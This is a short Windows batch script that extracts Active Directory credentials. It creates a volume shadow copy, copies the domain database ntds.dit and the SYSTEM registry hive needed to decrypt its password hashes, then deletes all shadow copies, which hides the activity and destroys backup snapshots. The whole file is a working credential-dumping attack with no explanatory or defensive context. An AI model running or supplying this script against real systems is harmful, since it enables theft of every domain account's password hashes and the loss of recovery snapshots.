@echo off
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\ntds\ntds.dit c:\
reg save hklm\system c:\system
vssadmin delete shadows /all
pause
